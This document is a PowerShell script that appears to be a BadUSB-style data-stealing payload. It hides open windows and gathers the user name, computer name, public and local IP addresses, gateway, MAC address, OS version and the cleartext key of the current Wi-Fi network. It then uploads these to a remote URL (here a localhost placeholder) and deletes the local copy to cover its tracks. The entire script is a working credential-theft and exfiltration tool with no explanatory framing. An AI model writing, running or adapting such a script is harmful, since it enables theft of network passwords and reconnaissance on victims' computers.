# Hide all windows
$null = (New-Object -ComObject Shell.Application).MinimizeAll()

# Define the remote URL
$remoteURL = "http://localhost:3002/capturedInfo"

# Find user name
$whoami = whoami

# Find computer name
$computerName = hostname

# Find Ip Address
$ipAddress = (Invoke-WebRequest -Uri "http://ipinfo.io/ip" -UseBasicParsing).Content

# Find local Ip Address
$localIpAddress = (Get-NetIPAddress | Where-Object {$_.AddressFamily -eq "IPv4" -and $_.PrefixOrigin -eq "Dhcp"}).IPAddress

$defaultGateway = (Get-NetRoute -DestinationPrefix 0.0.0.0/0 | Where-Object {$_.RouteMetric -eq 0}).NextHop

# Mac Address
$macAddress = (Get-NetAdapter | Where-Object {$_.Status -eq "Up"}).MacAddress

# Show open ports
# $openPorts = (Get-NetTCPConnection | Where-Object {$_.State -eq "Listen"}).LocalPort

# Find OS Version
$osVersion = (Get-WmiObject -Class Win32_OperatingSystem).Caption

# Find Wlan current Profile and show clear key
$wlanProfile = (netsh wlan show interfaces | Select-String -Pattern "Profile\s*:\s*").ToString().Split(":")[1].Trim()

# Get the WLAN profile's key or password
$wlanKey = (netsh wlan show profile name="$wlanProfile" key=clear | Select-String -Pattern "Key content\s*:\s*").ToString().Split(":")[1].Trim()

# Create a string with the results
$resultsString = @"
User: $whoami
Computer: $computerName
Public IP Address: $ipAddress
Local IP Address: $localIpAddress
Mac Address: $macAddress
Default Gateway: $defaultGateway
OS Version: $osVersion
WLAN Profile: $wlanProfile
WLAN Key: $wlanKey
"@

# Write results to txt file on desktop
$directory = [System.Environment]::GetFolderPath("Desktop")
$fileName = Join-Path $directory ("user_info.txt") 

$resultsString | Out-File -FilePath $fileName

# Write the contents of $results to the terminal
Write-Host "Results:"
Write-Host $resultsString

# Create a WebClient object
$webClient = New-Object System.Net.WebClient

try {
    # Upload the file to the remote URL
    $response = $webClient.UploadFile($remoteURL, $fileName)
    $responseString = [System.Text.Encoding]::UTF8.GetString($response)
    Write-Host "File uploaded successfully: $fileName"
    Write-Host "Server Response:"
    Write-Host $responseString
} catch {
    Write-Host "Error uploading file $fileName : $_"
} finally {
    # Delete the file after upload
    Remove-Item -Path $fileName -Force
    Write-Host "File deleted: $fileName"
}

# Dispose of the WebClient object
$webClient.Dispose()

# Close after processing all folders
exit